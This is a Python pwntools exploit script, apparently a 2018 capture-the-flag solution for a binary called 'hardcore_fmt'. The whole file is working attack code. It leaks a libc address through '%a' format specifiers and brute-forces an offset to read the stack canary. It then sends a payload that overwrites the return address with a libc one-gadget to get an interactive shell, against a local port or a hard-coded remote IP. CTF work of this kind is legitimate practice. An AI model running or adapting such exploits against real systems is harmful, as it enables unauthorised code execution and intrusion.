#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./hardcore_fmt"
elf=ELF(pwn_file)
os.environ = {"LD_LIBRARY_PATH":"./"}
libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
def get_cc():
    if len(sys.argv)==1:
        r=remote("127.1",60001)
        pid = 0 
    else:
        r=remote("39.106.110.69",9999)
        pid=0
    return r

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

for off in range(0x2c00,0x8000,0x100):
    r = get_cc()
    r.sendlineafter("fmt\n","%a"*5)
    r.recvuntil("10220x0.0")
    add = int(r.recvuntil("p")[:-1]+"00",16)
    print hex(add)
    log.info("offset :0x%x"%off)
    cookie_add = add - off + 0x29
    try:
        r.sendline(str(cookie_add))
        r.recvuntil(": ")
        data = r.recv(7,timeout = 0.5)
        if data == "":
            r.close()
            continue
        cookie = "\x00" + data
        break
    except  Exception as e:
        r.close()

libc.address =add - 0x61a100
f={
    0x108:cookie,
    0x128:p64(libc.address+0x4f322),
}
r.sendline(fit(f,filler="\x00",length=0x200))


r.interactive()
